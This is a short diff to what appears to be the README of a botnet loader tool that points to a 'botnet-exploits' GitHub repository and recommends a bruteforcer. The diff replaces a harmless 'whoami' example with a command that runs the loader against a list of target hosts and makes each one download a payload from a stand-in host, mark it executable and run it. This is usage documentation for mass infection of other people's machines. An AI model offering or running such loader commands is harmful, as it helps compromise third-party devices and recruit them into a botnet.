@@ -7,7 +7,7 @@ I reccomended bruteforcer https://github.com/CirqueiraDev/botnet-exploits/blob/m
 
 # Example usage:
   
-  **python loader.py -l targets.txt -t 20 -c "whoami**
+  **python loader.py -l targets.txt -t 20 -c "wget example.com/payload && chmod 777 payload && ./payload" **
   
   **python loader.py -l targets.txt -t 5 -o results.txt**
 ---
